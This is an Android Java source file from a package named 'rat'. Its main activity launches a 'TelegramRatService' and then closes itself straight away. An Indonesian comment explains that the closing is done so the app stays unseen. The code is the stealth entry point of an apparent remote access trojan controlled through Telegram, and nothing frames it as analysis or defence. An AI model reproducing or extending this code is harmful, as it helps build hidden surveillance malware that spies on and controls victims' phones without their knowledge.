package com.yourpackage.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // start service
        startService(new Intent(this, TelegramRatService.class));

        // langsung close activity (biar ga keliatan)
        finish();
    }
}